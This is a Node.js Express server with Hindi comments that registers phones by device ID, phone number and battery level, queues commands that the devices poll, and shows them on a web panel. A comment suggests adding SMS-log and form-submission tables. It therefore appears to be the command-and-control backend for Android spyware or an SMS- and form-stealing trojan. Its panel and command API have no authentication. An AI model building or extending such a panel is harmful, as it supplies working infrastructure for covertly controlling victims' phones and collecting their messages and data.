const express = require('express');
const { Pool } = require('pg');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// यह सुनिश्चित करें कि DATABASE_URL एनवायरनमेंट वेरिएबल Render में सेट है
if (!process.env.DATABASE_URL) {
    console.error("FATAL ERROR: DATABASE_URL is not set. Please set it in your Render environment variables.");
    process.exit(1); // अगर URL सेट नहीं है तो सर्वर को बंद कर दें
}

const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: {
        rejectUnauthorized: false // Render पर बाहरी कनेक्शन के लिए यह आवश्यक है
    }
});

// डेटाबेस टेबल बनाने का फंक्शन
async function createTables() {
    const client = await pool.connect();
    try {
        await client.query(`
            CREATE TABLE IF NOT EXISTS devices (
                id SERIAL PRIMARY KEY,
                device_id TEXT UNIQUE NOT NULL,
                device_name TEXT,
                os_version TEXT,
                phone_number TEXT,
                battery_level INTEGER,
                last_seen TIMESTAMPTZ NOT NULL,
                created_at TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP
            );
        `);
        await client.query(`
            CREATE TABLE IF NOT EXISTS commands (
                id SERIAL PRIMARY KEY,
                device_id TEXT NOT NULL,
                command_type TEXT NOT NULL,
                command_data JSONB NOT NULL,
                status TEXT NOT NULL DEFAULT 'pending',
                created_at TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP
            );
        `);
        await client.query(`
            CREATE TABLE IF NOT EXISTS global_settings (
                setting_key TEXT PRIMARY KEY UNIQUE NOT NULL,
                setting_value TEXT
            );
        `);
        // आप यहाँ और भी टेबल बना सकते हैं, जैसे sms_logs, form_submissions
        console.log("Database tables checked/created successfully for PostgreSQL.");
    } catch (err) {
        console.error("Error creating tables:", err);
        // अगर टेबल बनाने में कोई एरर आता है तो सर्वर को बंद कर दें
        process.exit(1);
    } finally {
        client.release();
    }
}

// सर्वर शुरू होने पर टेबल बनाएं
createTables();

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// --- वेब पैनल राउट्स ---

app.get('/', async (req, res) => {
    try {
        const devicesResult = await pool.query("SELECT * FROM devices ORDER BY last_seen DESC");
        const settingsResult = await pool.query("SELECT * FROM global_settings");

        const devices = devicesResult.rows.map(device => ({
            ...device,
            is_online: (new Date() - new Date(device.last_seen)) / 1000 < 190
        }));
        const settings = settingsResult.rows.reduce((acc, row) => ({ ...acc, [row.setting_key]: row.setting_value }), {});
        
        res.render('panel', { devices, settings });
    } catch (error) {
        console.error("Error loading panel data:", error);
        res.status(500).send("Error loading panel data: " + error.message);
    }
});

app.post('/delete-device/:deviceId', async (req, res) => {
    const { deviceId } = req.params;
    try {
        await pool.query("DELETE FROM devices WHERE device_id = $1", [deviceId]);
        // आप यहाँ से जुड़े हुए अन्य लॉग्स भी डिलीट कर सकते हैं
        res.redirect('/');
    } catch (error) {
        console.error('Error deleting device:', error);
        res.status(500).send("Error deleting device.");
    }
});


// --- API राउट्स ---

app.post('/api/device/register', async (req, res) => {
    const { device_id, device_name, os_version, battery_level, phone_number } = req.body;
    if (!device_id) {
        return res.status(400).json({ status: "error", message: "device_id is required" });
    }
    const now = new Date();
    try {
        const existingDevice = await pool.query("SELECT * FROM devices WHERE device_id = $1", [device_id]);
        if (existingDevice.rows.length > 0) {
            await pool.query(
                "UPDATE devices SET device_name = $1, os_version = $2, battery_level = $3, phone_number = $4, last_seen = $5 WHERE device_id = $6",
                [device_name, os_version, battery_level, phone_number, now, device_id]
            );
            res.json({ status: "success", action: "updated" });
        } else {
            await pool.query(
                `INSERT INTO devices (device_id, device_name, os_version, phone_number, battery_level, last_seen) VALUES ($1, $2, $3, $4, $5, $6)`,
                [device_id, device_name, os_version, phone_number, battery_level, now]
            );
            res.status(201).json({ status: "success", action: "created" });
        }
    } catch (error) {
        console.error('Error in /api/device/register:', error);
        res.status(500).json({ status: "error", message: error.message });
    }
});

app.post('/api/command/send', async (req, res) => {
    const { device_id, command_type, command_data } = req.body;
    try {
        await pool.query(
            `INSERT INTO commands (device_id, command_type, command_data) VALUES ($1, $2, $3)`,
            [device_id, command_type, command_data]
        );
        res.status(201).json({ status: "success" });
    } catch (error) {
        console.error('Error sending command:', error);
        res.status(500).json({ status: "error", message: error.message });
    }
});

app.get('/api/device/:deviceId/commands', async (req, res) => {
    const { deviceId } = req.params;
    const client = await pool.connect();
    try {
        await client.query('BEGIN');
        const result = await client.query("SELECT * FROM commands WHERE device_id = $1 AND status = 'pending' FOR UPDATE", [deviceId]);
        const commands = result.rows;
        if (commands.length > 0) {
            const idsToUpdate = commands.map(c => c.id);
            await client.query(`UPDATE commands SET status = 'sent' WHERE id = ANY($1::int[])`, [idsToUpdate]);
        }
        await client.query('COMMIT');
        res.json(commands);
    } catch (error) {
        await client.query('ROLLBACK');
        console.error('Error fetching commands:', error);
        res.status(500).json([]);
    } finally {
        client.release();
    }
});

app.post('/api/config/:setting', async (req, res) => {
    const { setting } = req.params;
    const value = req.body.value; // मान लीजिए वैल्यू 'value' की में आ रही है
    try {
        await pool.query(
            "INSERT INTO global_settings (setting_key, setting_value) VALUES ($1, $2) ON CONFLICT (setting_key) DO UPDATE SET setting_value = $2",
            [setting, value]
        );
        res.json({ status: "success" });
    } catch (error) {
        console.error(`Error saving setting ${setting}:`, error);
        res.status(500).json({ status: "error" });
    }
});

app.get('/api/config/:setting', async (req, res) => {
    const { setting } = req.params;
    try {
        const result = await pool.query("SELECT setting_value FROM global_settings WHERE setting_key = $1", [setting]);
        res.json({ value: result.rows.length > 0 ? result.rows[0].setting_value : null });
    } catch (error) {
        res.status(500).json({ value: null });
    }
});

app.listen(PORT, () => console.log(`Server with Web Panel running on port ${PORT}`));
